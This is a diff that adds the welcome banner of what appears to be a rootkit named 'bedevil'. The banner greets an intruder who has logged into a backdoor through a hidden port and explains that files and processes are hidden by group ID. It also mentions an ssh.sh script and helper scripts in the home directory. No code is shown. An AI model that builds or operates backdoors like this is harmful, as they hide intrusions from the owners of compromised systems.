@@ -1,0 +1,31 @@
+
+
+   /$$                       /$$                      /$$ /$$
+  | $$                      | $$                     |__/| $$
+  | $$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$    /$$ /$$| $$
+  | $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$|  $$  /$$/| $$| $$
+  | $$  \ $$| $$$$$$$$| $$  | $$| $$$$$$$$ \  $$/$$/ | $$| $$
+  | $$  | $$| $$_____/| $$  | $$| $$_____/  \  $$$/  | $$| $$
+  | $$$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$   \  $/   | $$| $$
+  |_______/  \_______/ \_______/ \_______/    \_/    |__/|__/
+                                                           
+                                                        
+(press q at any point to leave this screen, this will not show up again)
+
+Welcome to your backdoor. I hope you have a whaaaaaale of a time.
+I won't kill you with a wall of text, so here's all the
+important shizzle:
+    
+    - FILE/PROCESS HIDING is GID based ONLY.
+      Extended attributes are great, but not ALL boxes
+      have 'em. Plus they're a bit slower to use.
+      This also means that ANY FILES you create are
+      automatically hidden.
+    - I assume you've connected to this BACKDOOR
+      by utilising your HIDDEN PORT. If not, I suggest
+      you do that now. You can use my ssh.sh to do that.
+    - Your HOME DIRECTORY is VITAL. I've put SCRIPTS in
+      your HOME DIR, which RESIDE IN 'etc/'. You can RUN
+      THEM for more information.
+
+  - jack
